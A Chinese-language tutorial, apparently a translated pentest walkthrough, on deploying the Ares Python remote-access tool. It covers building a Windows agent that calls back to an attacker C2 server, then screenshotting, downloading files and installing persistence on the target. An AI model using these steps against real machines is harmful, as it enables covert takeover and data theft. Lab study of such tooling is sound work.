**本文我们将学习如何使用Ares这个工具。Ares是一个基于Python的B/S远控工具，Server端使用Flask进行开发，整体在浏览器就可以轻易操作。它运行在受感染的主机上，并确保CNC通信的顺利。该项目主要归功于Kevin
Locati，你可以在[GitHub](https://github.com/sweetsoftware/Ares)上找到它。**

对于本文中的演示，我将使用以下系统环境：

 **攻击者：** Kali Linux

 **目标：** Windows 10

## 安装

首先，我们需要在攻击者机器上安装该工具。我们直接从GitHub克隆它。完成后，我们通过cd命令遍历新创建的名为Ares的目录，如下所示。

    
    
    git clone //github.com/sweetsoftware/Ares.git
    cd Ares
    ls

![基于Python的BS远控Ares实战](https://image.3001.net/images/20190430/1556584651_5cc798cb43db0.png!small)

接下来，为了使工具可以正常工作，我们还需要安装一些依赖项。安装requirements.txt文件即可，该文件包含了需要安装的python库的详细信息。

    
    
    pip install -r requirements.txt

![基于Python的BS远控Ares实战](https://image.3001.net/images/20190430/1556584664_5cc798d847238.png!small)

因为我们的目标是Windows机器，因此我们需要编译与Windows机器兼容的agent。为此，我们需要先来安装wine。这里可能需要花费一些时间。

    
    
    ls
    ./wine_setup.sh

##
![基于Python的BS远控Ares实战](https://image.3001.net/images/20190430/1556584678_5cc798e625928.png!small)

## 目标利用

至此，我们已成功安装了运行Ares所需的所有条件。接下来我们就可以来尝试获取与目标机器的CNC会话了。想要达到这个目的，我们还需要一个agent。我们使用cd命令遍历agent目录。然后通过ls命令列出文件，找到其中的一个配置文件。我们需要编辑该文件以获取会话。

    
    
    cd agent/
    ls
    nano config.py

![基于Python的BS远控Ares实战](https://image.3001.net/images/20190430/1556584695_5cc798f7eb9f7.png!small)

可以看到，当我们使用nano命令打开配置文件后，其中的SERVER变量处有一个IP地址。我们编辑并将其更改为攻击者机器的内网IP地址，这里以我的IP（192.168.1.4）为例。其他参数值我们无需修改，保存并退出nano编辑器。

![基于Python的BS远控Ares实战](https://image.3001.net/images/20190430/1556584709_5cc79905bbbc3.png!small)

config文件配置完成后，下面我们来创建一个代理。因为我们的目标机器是Windows，所以我们将使用以下命令创建一个Windows的代理。

    
    
    ./builder.py -p Windows –server //192.168.1.4:8080 -o agent.exe

![基于Python的BS远控Ares实战](https://image.3001.net/images/20190430/1556584725_5cc799158223e.png!small)

创建完成后你可以选择一种你喜欢的方式，将这个代理发送到目标计算机上。之后，我们需要启动服务器。这是必需的，因为代理将与该服务器通信。让我们回到Ares目录。这里有一个名为server的子目录。在遍历它之后，我们需要初始化数据库（仅在第一次使用时需要初始化数据库），因为我们将使用initdb参数。现在，我们将运行服务器如下图所示。

    
    
    ls
    cd server/
    ./ares.py initdb
    ./ares.py runserver -h 0.0.0.0 -p 8080 --threaded

![基于Python的BS远控Ares实战](https://image.3001.net/images/20190430/1556584742_5cc799260e951.png!small)

现在，我们在浏览器中导航到服务器IP。你将看到一个表单，要求我们设置一个密码。输入完成后，单击“ Define”继续。

![基于Python的BS远控Ares实战](https://image.3001.net/images/20190430/1556584759_5cc799371c596.png!small)

接着，会要求我们输入刚刚设置的密码进行登录。

![基于Python的BS远控Ares实战](https://image.3001.net/images/20190430/1556584776_5cc7994811529.png!small)

这里我们可以看到Ares GUI的几个主索引，包括：Change Password，Disconnect，Agent
List。现在，让我们回到创建代理的那步。只有在目标机器上执行代理后，我们才会在Agent List中获得一个Agent。

![基于Python的BS远控Ares实战](https://image.3001.net/images/20190430/1556584798_5cc7995e56858.png!small)

正如下图中所示，我们有一个存活的agent。我们可以看到代理的名称，状态，代理上线时登录的用户，同样我们也有主机名。我们还获取到了目标的IP和系统类型。这里，我们可以在多个设备上运行代理，每个设备都可以在这里被查看到。我们可以从这里选择会话，同时在多个会话上执行相同的命令。让我们点击名称继续。

![基于Python的BS远控Ares实战](https://image.3001.net/images/20190430/1556584816_5cc799705a811.png!small)

## 命令执行

让我们先来运行一个systeminfo命令看看。如下所示，我们获取到了目标机器的所有系统配置信息。

    
    
    systeminfo

##
**![基于Python的BS远控Ares实战](https://image.3001.net/images/20190430/1556584833_5cc79981c51ad.png!small)**

##  **截屏**

现在，让我们来尝试截取目标机器的屏幕。输入屏幕截取命令，代理将捕获屏幕截图并提供如图所示的链接。打开该链接，我们就可以查看到最新的屏幕截图。

    
    
    screenshot

##
![基于Python的BS远控Ares实战](https://image.3001.net/images/20190430/1556584852_5cc7999498243.png!small)

## 文件下载

我们还可以使用该代理从远程目标下载文件。想要下载文件必须要知道文件名，我们可以使用dir命令获取文件名。知道文件名后，我们就可以将相应的文件下载到我们本地的攻击机上，如下图所示。

    
    
    download file.txt

##
![基于Python的BS远控Ares实战](https://image.3001.net/images/20190430/1556584876_5cc799ac0ea65.png!small)

## 压缩文件

我们可以使用Ares
agent压缩远程目标上的目录。同样需要目录名。提取目录名后，我们可以使用以下命令远程压缩文件。这里的'sample'是目录的名称，'compressed.zip'是压缩文件的名称。

    
    
    zip compressed.zip sample

##
![基于Python的BS远控Ares实战](https://image.3001.net/images/20190430/1556584897_5cc799c15cf8d.png!small)

## 持久化代理

我们可以使用persist命令来调用代理中的persistence。该命令会在远程目标上安装代理。

    
    
    persist

##
**![基于Python的BS远控Ares实战](https://image.3001.net/images/20190430/1556584920_5cc799d8862ce.png!small)**

##  **Clean Up**

最后任务完成后，我们可以使用clean命令从目标计算机中删除代理。

    
    
    clean

![基于Python的BS远控Ares实战](https://image.3001.net/images/20190430/1556584938_5cc799ea82160.png!small)

 ***参考来源：[hackingarticles](https://www.hackingarticles.in/command-control-ares/)，FB小编secist编译，转载请注明来自FreeBuf.COM**  

